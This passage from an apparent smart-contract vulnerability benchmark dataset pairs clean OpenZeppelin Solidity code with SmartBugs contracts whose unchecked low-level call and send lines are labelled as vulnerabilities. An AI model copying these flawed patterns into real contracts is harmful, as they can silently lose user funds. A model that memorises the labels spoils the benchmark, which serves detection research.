    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/cryptography/verifiers/ERC7913WebAuthnVerifier.sol)\n\npragma solidity ^0.8.24;\n\nimport {WebAuthn} from \"../WebAuthn.sol\";\nimport {IERC7913SignatureVerifier} from \"../../../interfaces/IERC7913.sol\";\n\n/**\n * @dev ERC-7913 signature verifier that supports WebAuthn authentication assertions.\n *\n * This verifier enables the validation of WebAuthn signatures using P256 public keys.\n * The key is expected to be a 64-byte concatenation of the P256 public key coordinates (qx || qy).\n * The signature is expected to be an abi-encoded {WebAuthn-WebAuthnAuth} struct.\n *\n * Uses {WebAuthn-verify} for signature verification, which performs the essential\n * WebAuthn checks: type validation, challenge matching, and cryptographic signature verification.\n *\n * NOTE: Wallets that may require default P256 validation may install a P256 verifier separately.\n *\n * @custom:stateless\n */\ncontract ERC7913WebAuthnVerifier is IERC7913SignatureVerifier {\n    /// @inheritdoc IERC7913SignatureVerifier\n    function verify(bytes calldata key, bytes32 hash, bytes calldata signature) public view virtual returns (bytes4) {\n        (bool decodeSuccess, WebAuthn.WebAuthnAuth calldata auth) = WebAuthn.tryDecodeAuth(signature);\n\n        return\n            decodeSuccess &&\n                key.length == 0x40 &&\n                WebAuthn.verify(abi.encodePacked(hash), auth, bytes32(key[0x00:0x20]), bytes32(key[0x20:0x40]))\n                ? IERC7913SignatureVerifier.verify.selector\n                : bytes4(0xFFFFFFFF);\n    }\n}\n",
    "num_lines": 36,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x524960d55174d912768678d8c606b4d50b79d7b1",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x524960d55174d912768678d8c606b4d50b79d7b1.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 21\n */\n\npragma solidity ^0.4.13;\n\ncontract Centra4 {\n\n\tfunction transfer() returns (bool) {\t\n\t\taddress contract_address;\n\t\tcontract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n\t\taddress c1;\t\t\n\t\taddress c2;\n\t\tuint256 k;\n\t\tk = 1;\n\t\t\n\t\tc2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;\t\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\t\n\t\tcontract_address.call(\"register\", \"CentraToken\");\n\t\tif(!contract_address.call(bytes4(keccak256(\"transfer(address,uint256)\")),c2,k)) return false;\n\n\t\treturn true;\n\t}\n\n}",
    "num_lines": 27,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "Calldata",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/Calldata.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/Calldata.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Helper library for manipulating objects in calldata.\n */\nlibrary Calldata {\n    // slither-disable-next-line write-after-write\n    function emptyBytes() internal pure returns (bytes calldata result) {\n        assembly (\"memory-safe\") {\n            result.offset := 0\n            result.length := 0\n        }\n    }\n\n    // slither-disable-next-line write-after-write\n    function emptyString() internal pure returns (string calldata result) {\n        assembly (\"memory-safe\") {\n            result.offset := 0\n            result.length := 0\n        }\n    }\n}\n",
    "num_lines": 26,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "etherpot_lotto",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/etherpot_lotto.sol",
    "contract_code": "/*\n * @source: https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol\n * @author: -\n * @vulnerable_at_lines: 109,141\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\n contract Lotto {\n\n     uint constant public blocksPerRound = 6800;\n     // there are an infinite number of rounds (just like a real lottery that takes place every week). `blocksPerRound` decides how many blocks each round will last. 6800 is around a day.\n\n     uint constant public ticketPrice = 100000000000000000;\n     // the cost of each ticket is .1 ether.\n\n     uint constant public blockReward = 5000000000000000000;\n\n     function getBlocksPerRound() constant returns(uint){ return blocksPerRound; }\n     function getTicketPrice() constant returns(uint){ return ticketPrice; }\n     //accessors for constants\n\n     struct Round {\n         address[] buyers;\n         uint pot;\n         uint ticketsCount;\n         mapping(uint=>bool) isCashed;\n         mapping(address=>uint) ticketsCountByBuyer;\n     }\n     mapping(uint => Round) rounds;\n     //the contract maintains a mapping of rounds. Each round maintains a list of tickets, the total amount of the pot, and whether or not the round was \"cashed\". \"Cashing\" is the act of paying out the pot to the winner.\n\n     function getRoundIndex() constant returns (uint){\n         //The round index tells us which round we're on. For example if we're on block 24, we're on round 2. Division in Solidity automatically rounds down, so we don't need to worry about decimals.\n\n         return block.number/blocksPerRound;\n     }\n\n     function getIsCashed(uint roundIndex,uint subpotIndex) constant returns (bool){\n         //Determine if a given.\n\n         return rounds[roundIndex].isCashed[subpotIndex];\n     }\n\n\n     function calculateWinner(uint roundIndex, uint subpotIndex) constant returns(address){\n         //note this function only calculates the winners. It does not do any state changes and therefore does not include various validitiy checks\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n         //We can't decided the winner if the round isn't over yet\n\n         var decisionBlockHash = getHashOfBlock(decisionBlockNumber);\n         var winningTicketIndex = decisionBlockHash%rounds[roundIndex].ticketsCount;\n         //We perform a modulus of the blockhash to determine the winner\n\n         var ticketIndex = uint256(0);\n\n         for(var buyerIndex = 0; buyerIndex<rounds[roundIndex].buyers.length; buyerIndex++){\n             var buyer = rounds[roundIndex].buyers[buyerIndex];\n             ticketIndex+=rounds[roundIndex].ticketsCountByBuyer[buyer];\n\n             if(ticketIndex>winningTicketIndex){\n                 return buyer;\n             }\n         }\n     }\n\n     function getDecisionBlockNumber(uint roundIndex,uint subpotIndex) constant returns (uint){\n         return ((roundIndex+1)*blocksPerRound)+subpotIndex;\n     }\n\n     function getSubpotsCount(uint roundIndex) constant returns(uint){\n         var subpotsCount = rounds[roundIndex].pot/blockReward;\n\n         if(rounds[roundIndex].pot%blockReward>0)\n             subpotsCount++;\n\n         return subpotsCount;\n     }\n\n     function getSubpot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot/getSubpotsCount(roundIndex);\n     }\n\n     function cash(uint roundIndex, uint subpotIndex){\n\n         var subpotsCount = getSubpotsCount(roundIndex);\n\n         if(subpotIndex>=subpotsCount)\n             return;\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n\n         if(rounds[roundIndex].isCashed[subpotIndex])\n             return;\n         //Subpots can only be cashed once. This is to prevent double payouts\n\n         var winner = calculateWinner(roundIndex,subpotIndex);\n         var subpot = getSubpot(roundIndex);\n\n         // <yes> <report> UNCHECKED_LL_CALLS\n         winner.send(subpot);\n\n         rounds[roundIndex].isCashed[subpotIndex] = true;\n         //Mark the round as cashed\n     }\n\n     function getHashOfBlock(uint blockIndex) constant returns(uint){\n         return uint(block.blockhash(blockIndex));\n     }\n\n     function getBuyers(uint roundIndex,address buyer) constant returns (address[]){\n         return rounds[roundIndex].buyers;\n     }\n\n     function getTicketsCountByBuyer(uint roundIndex,address buyer) constant returns (uint){\n         return rounds[roundIndex].ticketsCountByBuyer[buyer];\n     }\n\n     function getPot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot;\n     }\n\n     function() {\n         //this is the function that gets called when people send money to the contract.\n\n         var roundIndex = getRoundIndex();\n         var value = msg.value-(msg.value%ticketPrice);\n\n         if(value==0) return;\n\n         if(value<msg.value){\n             // <yes> <report> UNCHECKED_LL_CALLS\n             msg.sender.send(msg.value-value);\n         }\n         //no partial tickets, send a partial refund\n\n         var ticketsCount = value/ticketPrice;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n\n         if(rounds[roundIndex].ticketsCountByBuyer[msg.sender]==0){\n             var buyersLength = rounds[roundIndex].buyers.length++;\n             rounds[roundIndex].buyers[buyersLength] = msg.sender;\n         }\n\n         rounds[roundIndex].ticketsCountByBuyer[msg.sender]+=ticketsCount;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n         //keep track of the total tickets\n\n         rounds[roundIndex].pot+=value;\n         //keep track of the total pot\n\n     }\n\n }\n",
    "num_lines": 163,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xbaa3de6504690efb064420d89e871c27065cdd52",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.23;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.25 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
    "num_lines": 42,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x958a8f594101d2c0485a52319f29b2647f2ebc06",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 55\n */\n\npragma solidity ^0.4.16;\n\n/// @author Jordi Baylina\n/// Auditors: Griff Green & psdev\n/// @notice Based on http://hudsonjameson.com/ethereummarriage/\n/// License: GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    address public owner;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public newOwner;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function changeOwner(address _newOwner) onlyOwner {\n        newOwner = _newOwner;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function acceptOwnership() {\n        if (msg.sender == newOwner) {\n            owner = newOwner;\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n         // <yes> <report> UNCHECKED_LL_CALLS\n        _dst.call.value(_value)(_data);\n    }\n}\n\n\ncontract Marriage is Owned\n{\n    // Marriage data variables\n    string public partner1;\n    string public partner2;\n    uint public marriageDate;\n    string public marriageStatus;\n    string public vows;\n\n    Event[] public majorEvents;\n    Message[] public messages;\n\n    struct Event {\n        uint date;\n        string name;\n        string description;\n        string url;\n    }\n\n    struct Message {\n        uint date;\n        string nameFrom;\n        string text;\n        string url;\n        uint value;\n    }\n\n    modifier areMarried {\n        require(sha3(marriageStatus) == sha3(\"Married\"));\n        _;\n    }\n\n    //Set Owner\n    function Marriage(address _owner) {\n        owner = _owner;\n    }\n\n    function numberOfMajorEvents() constant public returns (uint) {\n        return majorEvents.length;\n    }\n\n    function numberOfMessages() constant public returns (uint) {\n        return messages.length;\n    }\n\n    // Create initial marriage contract\n    function createMarriage(\n        string _partner1,\n        string _partner2,\n        string _vows,\n        string url) onlyOwner\n    {\n        require(majorEvents.length == 0);\n        partner1 = _partner1;\n        partner2 = _partner2;\n        marriageDate = now;\n        vows = _vows;\n        marriageStatus = \"Married\";\n        majorEvents.push(Event(now, \"Marriage\", vows, url));\n        MajorEvent(\"Marrigage\", vows, url);\n    }\n\n    // Set the marriage status if it changes\n    function setStatus(string status, string url) onlyOwner\n    {\n        marriageStatus = status;\n        setMajorEvent(\"Changed Status\", status, url);\n    }\n\n    // Set the IPFS hash of the image of the couple\n    function setMajorEvent(string name, string description, string url) onlyOwner areMarried\n    {\n        majorEvents.push(Event(now, name, description, url));\n        MajorEvent(name, description, url);\n    }\n\n    function sendMessage(string nameFrom, string text, string url) payable areMarried {\n        if (msg.value > 0) {\n            owner.transfer(this.balance);\n        }\n        messages.push(Message(now, nameFrom, text, url, msg.value));\n        MessageSent(nameFrom, text, url, msg.value);\n    }\n\n\n    // Declare event structure\n    event MajorEvent(string name, string description, string url);\n    event MessageSent(string name, string description, string url, uint value);\n}",
    "num_lines": 148,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC20FlashMint",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20FlashMint.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/ERC20FlashMint.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC3156FlashBorrower} from \"../../../interfaces/IERC3156FlashBorrower.sol\";\nimport {IERC3156FlashLender} from \"../../../interfaces/IERC3156FlashLender.sol\";\nimport {ERC20} from \"../ERC20.sol\";\n\n/**\n * @dev Implementation of the ERC-3156 Flash loans extension, as defined in\n * https://eips.ethereum.org/EIPS/eip-3156[ERC-3156].\n *\n * Adds the {flashLoan} method, which provides flash loan support at the token\n * level. By default there is no fee, but this can be changed by overriding {flashFee}.\n *\n * NOTE: When this extension is used along with the {ERC20Capped} or {ERC20Votes} extensions,\n * {maxFlashLoan} will not correctly reflect the maximum that can be flash minted. We recommend\n * overriding {maxFlashLoan} so that it correctly reflects the supply cap.\n */\nabstract contract ERC20FlashMint is ERC20, IERC3156FlashLender {\n    bytes32 private constant RETURN_VALUE = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n    /**\n     * @dev The loan token is not valid.\n     */\n    error ERC3156UnsupportedToken(address token);\n\n    /**\n     * @dev The requested loan exceeds the max loan value for `token`.\n     */\n    error ERC3156ExceededMaxLoan(uint256 maxLoan);\n\n    /**\n     * @dev The receiver of a flashloan is not a valid {IERC3156FlashBorrower-onFlashLoan} implementer.\n     */\n    error ERC3156InvalidReceiver(address receiver);\n\n    /**\n     * @dev Returns the maximum amount of tokens available for loan.\n     *\n     * NOTE: This function will not automatically detect any supply cap\n     * added by other extensions, such as {ERC20Capped}. If necessary,\n     * override this function to take a supply cap into account.\n     *\n     * @param token The address of the token that is requested.\n     * @return The amount of token that can be loaned.\n     */\n    function maxFlashLoan(address token) public view virtual returns (uint256) {\n        return token == address(this) ? type(uint256).max - totalSupply() : 0;\n    }\n\n    /**\n     * @dev Returns the fee applied when doing flash loans. This function calls\n     * the {_flashFee} function which returns the fee applied when doing flash\n     * loans.\n     * @param token The token to be flash loaned.\n     * @param value The amount of tokens to be loaned.\n     * @return The fees applied to the corresponding flash loan.\n     */\n    function flashFee(address token, uint256 value) public view virtual returns (uint256) {\n        if (token != address(this)) {\n            revert ERC3156UnsupportedToken(token);\n        }\n        return _flashFee(token, value);\n    }\n\n    /**\n     * @dev Returns the fee applied when doing flash loans. By default this\n     * implementation has 0 fees. This function can be overloaded to make\n     * the flash loan mechanism deflationary.\n     * @return The fees applied to the corresponding flash loan.\n     */\n    function _flashFee(address /*token*/, uint256 /*value*/) internal view virtual returns (uint256) {\n        return 0;\n    }\n\n    /**\n     * @dev Returns the receiver address of the flash fee. By default this\n     * implementation returns the address(0) which means the fee amount will be burnt.\n     * This function can be overloaded to change the fee receiver.\n     * @return The address for which the flash fee will be sent to.\n     */\n    function _flashFeeReceiver() internal view virtual returns (address) {\n        return address(0);\n    }\n\n    /**\n     * @dev Performs a flash loan. New tokens are minted and sent to the\n     * `receiver`, who is required to implement the {IERC3156FlashBorrower}\n     * interface. By the end of the flash loan, the receiver is expected to own\n     * value + fee tokens and have them approved back to the token contract itself so\n     * they can be burned.\n     * @param receiver The receiver of the flash loan. Should implement the\n     * {IERC3156FlashBorrower-onFlashLoan} interface.\n     * @param token The token to be flash loaned. Only `address(this)` is\n     * supported.\n     * @param value The amount of tokens to be loaned.\n     * @param data An arbitrary datafield that is passed to the receiver.\n     * @return `true` if the flash loan was successful.\n     */\n    // This function can reenter, but it doesn't pose a risk because it always preserves the property that the amount\n    // minted at the beginning is always recovered and burned at the end, or else the entire function will revert.\n    // slither-disable-next-line reentrancy-no-eth\n    function flashLoan(\n        IERC3156FlashBorrower receiver,\n        address token,\n        uint256 value,\n        bytes calldata data\n    ) public virtual returns (bool) {\n        uint256 maxLoan = maxFlashLoan(token);\n        if (value > maxLoan) {\n            revert ERC3156ExceededMaxLoan(maxLoan);\n        }\n        uint256 fee = flashFee(token, value);\n        _mint(address(receiver), value);\n        if (receiver.onFlashLoan(_msgSender(), token, value, fee, data) != RETURN_VALUE) {\n            revert ERC3156InvalidReceiver(address(receiver));\n        }\n        address flashFeeReceiver = _flashFeeReceiver();\n        _spendAllowance(address(receiver), address(this), value + fee);\n        if (fee == 0 || flashFeeReceiver == address(0)) {\n            _burn(address(receiver), value + fee);\n        } else {\n            _burn(address(receiver), value);\n            _transfer(address(receiver), flashFeeReceiver, fee);\n        }\n        return true;\n    }\n}\n",
    "num_lines": 131,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x663e4229142a27f00bafb5d087e1e730648314c3",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 1152,1496,2467\n */\n\npragma solidity ^0.4.24;\n\n\ncontract ERC20 {\n    function totalSupply() constant returns (uint supply);\n    function balanceOf( address who ) constant returns (uint value);\n    function allowance( address owner, address spender ) constant returns (uint _allowance);\n\n    function transfer( address to, uint value) returns (bool ok);\n    function transferFrom( address from, address to, uint value) returns (bool ok);\n    function approve( address spender, uint value ) returns (bool ok);\n\n    event Transfer( address indexed from, address indexed to, uint value);\n    event Approval( address indexed owner, address indexed spender, uint value);\n}\n/**\n * @title Ownable\n * @dev The Ownable contract has an owner address, and provides basic authorization control\n * functions, this simplifies the implementation of \"user permissions\".\n */\ncontract Ownable {\n  address public owner;\n\n\n  /**\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n   * account.\n   */\n  function Ownable() {\n    owner = msg.sender;\n  }\n\n\n  /**\n   * @dev Throws if called by any account other than the owner.\n   */\n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n\n\n  /**\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\n   * @param newOwner The address to transfer ownership to.\n   */\n  function transferOwnership(address newOwner) onlyOwner {\n    if (newOwner != address(0)) {\n      owner = newOwner;\n    }\n  }\n\n}\n\n/// @title Interface for contracts conforming to ERC-721: Non-Fungible Tokens\n/// @author Dieter Shirley <dete@axiomzen.co> (https://github.com/dete)\ncontract ERC721 {\n    // Required methods\n    function totalSupply() public view returns (uint256 total);\n    function balanceOf(address _owner) public view returns (uint256 balance);\n    function ownerOf(uint256 _tokenId) external view returns (address owner);\n    function approve(address _to, uint256 _tokenId) external;\n    function transfer(address _to, uint256 _tokenId) external;\n    function transferFrom(address _from, address _to, uint256 _tokenId) external;\n\n    // Events\n    event Transfer(address from, address to, uint256 tokenId);\n    event Approval(address owner, address approved, uint256 tokenId);\n\n    // Optional\n    // function name() public view returns (string name);\n    // function symbol() public view returns (string symbol);\n    // function tokensOfOwner(address _owner) external view returns (uint256[] tokenIds);\n    // function tokenMetadata(uint256 _tokenId, string _preferredTransport) public view returns (string infoUrl);\n\n    // ERC-165 Compatibility (https://github.com/ethereum/EIPs/issues/165)\n    function supportsInterface(bytes4 _interfaceID) external view returns (bool);\n}\n\ncontract GeneScienceInterface {\n    /// @dev simply a boolean to indicate this is the contract we expect to be\n    function isGeneScience() public pure returns (bool);\n\n    /// @dev given genes of kitten 1 & 2, return a genetic combination - may have a random factor\n    /// @param genes1 genes of mom\n    /// @param genes2 genes of sire\n    /// @return the genes that are supposed to be passed down the child\n    function mixGenes(uint256[2] genes1, uint256[2] genes2,uint256 g1,uint256 g2, uint256 targetBlock) public returns (uint256[2]);\n\n    function getPureFromGene(uint256[2] gene) public view returns(uint256);\n\n    /// @dev get sex from genes 0: female 1: male\n    function getSex(uint256[2] gene) public view returns(uint256);\n\n    /// @dev get wizz type from gene\n    function getWizzType(uint256[2] gene) public view returns(uint256);\n\n    function clearWizzType(uint256[2] _gene) public returns(uint256[2]);\n}\n\n/// @title A facet of PandaCore that manages special access privileges.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaAccessControl {\n    // This facet controls access control for CryptoPandas. There are four roles managed here:\n    //\n    //     - The CEO: The CEO can reassign other roles and change the addresses of our dependent smart\n    //         contracts. It is also the only role that can unpause the smart contract. It is initially\n    //         set to the address that created the smart contract in the PandaCore constructor.\n    //\n    //     - The CFO: The CFO can withdraw funds from PandaCore and its auction contracts.\n    //\n    //     - The COO: The COO can release gen0 pandas to auction, and mint promo cats.\n    //\n    // It should be noted that these roles are distinct without overlap in their access abilities, the\n    // abilities listed for each role above are exhaustive. In particular, while the CEO can assign any\n    // address to any role, the CEO address itself doesn't have the ability to act in those roles. This\n    // restriction is intentional so that we aren't tempted to use the CEO address frequently out of\n    // convenience. The less we use an address, the less likely it is that we somehow compromise the\n    // account.\n\n    /// @dev Emited when contract is upgraded - See README.md for updgrade plan\n    event ContractUpgrade(address newContract);\n\n    // The addresses of the accounts (or contracts) that can execute actions within each roles.\n    address public ceoAddress;\n    address public cfoAddress;\n    address public cooAddress;\n\n    // @dev Keeps track whether the contract is paused. When that is true, most actions are blocked\n    bool public paused = false;\n\n    /// @dev Access modifier for CEO-only functionality\n    modifier onlyCEO() {\n        require(msg.sender == ceoAddress);\n        _;\n    }\n\n    /// @dev Access modifier for CFO-only functionality\n    modifier onlyCFO() {\n        require(msg.sender == cfoAddress);\n        _;\n    }\n\n    /// @dev Access modifier for COO-only functionality\n    modifier onlyCOO() {\n        require(msg.sender == cooAddress);\n        _;\n    }\n\n    modifier onlyCLevel() {\n        require(\n            msg.sender == cooAddress ||\n            msg.sender == ceoAddress ||\n            msg.sender == cfoAddress\n        );\n        _;\n    }\n\n    /// @dev Assigns a new address to act as the CEO. Only available to the current CEO.\n    /// @param _newCEO The address of the new CEO\n    function setCEO(address _newCEO) external onlyCEO {\n        require(_newCEO != address(0));\n\n        ceoAddress = _newCEO;\n    }\n\n    /// @dev Assigns a new address to act as the CFO. Only available to the current CEO.\n    /// @param _newCFO The address of the new CFO\n    function setCFO(address _newCFO) external onlyCEO {\n        require(_newCFO != address(0));\n\n        cfoAddress = _newCFO;\n    }\n\n    /// @dev Assigns a new address to act as the COO. Only available to the current CEO.\n    /// @param _newCOO The address of the new COO\n    function setCOO(address _newCOO) external onlyCEO {\n        require(_newCOO != address(0));\n\n        cooAddress = _newCOO;\n    }\n\n    /*** Pausable functionality adapted from OpenZeppelin ***/\n\n    /// @dev Modifier to allow actions only when the contract IS NOT paused\n    modifier whenNotPaused() {\n        require(!paused);\n        _;\n    }\n\n    /// @dev Modifier to allow actions only when the contract IS paused\n    modifier whenPaused {\n        require(paused);\n        _;\n    }\n\n    /// @dev Called by any \"C-level\" role to pause the contract. Used only when\n    ///  a bug or exploit is detected and we need to limit damage.\n    function pause() external onlyCLevel whenNotPaused {\n        paused = true;\n    }\n\n    /// @dev Unpauses the smart contract. Can only be called by the CEO, since\n    ///  one reason we may pause the contract is when CFO or COO accounts are\n    ///  compromised.\n    /// @notice This is public rather than external so it can be called by\n    ///  derived contracts.\n    function unpause() public onlyCEO whenPaused {\n        // can't unpause if contract was upgraded\n        paused = false;\n    }\n}\n\n\n\n\n\n\n\n\n/// @title Base contract for CryptoPandas. Holds all common structs, events and base variables.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaBase is PandaAccessControl {\n    /*** EVENTS ***/\n\n    uint256 public constant GEN0_TOTAL_COUNT = 16200;\n    uint256 public gen0CreatedCount;\n\n    /// @dev The Birth event is fired whenever a new kitten comes into existence. This obviously\n    ///  includes any time a cat is created through the giveBirth method, but it is also called\n    ///  when a new gen0 cat is created.\n    event Birth(address owner, uint256 pandaId, uint256 matronId, uint256 sireId, uint256[2] genes);\n\n    /// @dev Transfer event as defined in current draft of ERC721. Emitted every time a kitten\n    ///  ownership is assigned, including births.\n    event Transfer(address from, address to, uint256 tokenId);\n\n    /*** DATA TYPES ***/\n\n    /// @dev The main Panda struct. Every cat in CryptoPandas is represented by a copy\n    ///  of this structure, so great care was taken to ensure that it fits neatly into\n    ///  exactly two 256-bit words. Note that the order of the members in this structure\n    ///  Ref: http://solidity.readthedocs.io/en/develop/miscellaneous.html\n    struct Panda {\n        // The Panda's genetic code is packed into these 256-bits, the format is\n        // sooper-sekret! A cat's genes never change.\n        uint256[2] genes;\n\n        // The timestamp from the block when this cat came into existence.\n        uint64 birthTime;\n\n        // The minimum timestamp after which this cat can engage in breeding\n        // activities again. This same timestamp is used for the pregnancy\n        // timer (for matrons) as well as the siring cooldown.\n        uint64 cooldownEndBlock;\n\n        // The ID of the parents of this panda, set to 0 for gen0 cats.\n        // Note that using 32-bit unsigned integers limits us to a \"mere\"\n        // 4 billion cats. This number might seem small until you realize\n        // that Ethereum currently has a limit of about 500 million\n        // transactions per year! So, this definitely won't be a problem\n        // for several years (even as Ethereum learns to scale).\n        uint32 matronId;\n        uint32 sireId;\n\n        // Set to the ID of the sire cat for matrons that are pregnant,\n        // zero otherwise. A non-zero value here is how we know a cat\n        // is pregnant. Used to retrieve the genetic material for the new\n        // kitten when the birth transpires.\n        uint32 siringWithId;\n\n        // Set to the index in the cooldown array (see below) that represents\n        // the current cooldown duration for this Panda. This starts at zero\n        // for gen0 cats, and is initialized to floor(generation/2) for others.\n        // Incremented by one for each successful breeding action, regardless\n        // of whether this cat is acting as matron or sire.\n        uint16 cooldownIndex;\n\n        // The \"generation number\" of this cat. Cats minted by the CK contract\n        // for sale are called \"gen0\" and have a generation number of 0. The\n        // generation number of all other cats is the larger of the two generation\n        // numbers of their parents, plus one.\n        // (i.e. max(matron.generation, sire.generation) + 1)\n        uint16 generation;\n    }\n\n    /*** CONSTANTS ***/\n\n    /// @dev A lookup table indicating the cooldown duration after any successful\n    ///  breeding action, called \"pregnancy time\" for matrons and \"siring cooldown\"\n    ///  for sires. Designed such that the cooldown roughly doubles each time a cat\n    ///  is bred, encouraging owners not to just keep breeding the same cat over\n    ///  and over again. Caps out at one week (a cat can breed an unbounded number\n    ///  of times, and the maximum cooldown is always seven days).\n    uint32[9] public cooldowns = [\n        uint32(5 minutes),\n        uint32(30 minutes),\n        uint32(2 hours),\n        uint32(4 hours),    \n        uint32(8 hours),\n        uint32(24 hours),\n        uint32(48 hours),\n        uint32(72 hours),\n        uint32(7 days)\n    ];\n\n    // An approximation of currently how many seconds are in between blocks.\n    uint256 public secondsPerBlock = 15;\n\n    /*** STORAGE ***/\n\n    /// @dev An array containing the Panda struct for all Pandas in existence. The ID\n    ///  of each cat is actually an index into this array. Note that ID 0 is a negacat,\n    ///  the unPanda, the mythical beast that is the parent of all gen0 cats. A bizarre\n    ///  creature that is both matron and sire... to itself! Has an invalid genetic code.\n    ///  In other words, cat ID 0 is invalid... ;-)\n    Panda[] pandas;\n\n    /// @dev A mapping from cat IDs to the address that owns them. All cats have\n    ///  some valid owner address, even gen0 cats are created with a non-zero owner.\n    mapping (uint256 => address) public pandaIndexToOwner;\n\n    // @dev A mapping from owner address to count of tokens that address owns.\n    //  Used internally inside balanceOf() to resolve ownership count.\n    mapping (address => uint256) ownershipTokenCount;\n\n    /// @dev A mapping from PandaIDs to an address that has been approved to call\n    ///  transferFrom(). Each Panda can only have one approved address for transfer\n    ///  at any time. A zero value means no approval is outstanding.\n    mapping (uint256 => address) public pandaIndexToApproved;\n\n    /// @dev A mapping from PandaIDs to an address that has been approved to use\n    ///  this Panda for siring via breedWith(). Each Panda can only have one approved\n    ///  address for siring at any time. A zero value means no approval is outstanding.\n    mapping (uint256 => address) public sireAllowedToAddress;\n\n    /// @dev The address of the ClockAuction contract that handles sales of Pandas. This\n    ///  same contract handles both peer-to-peer 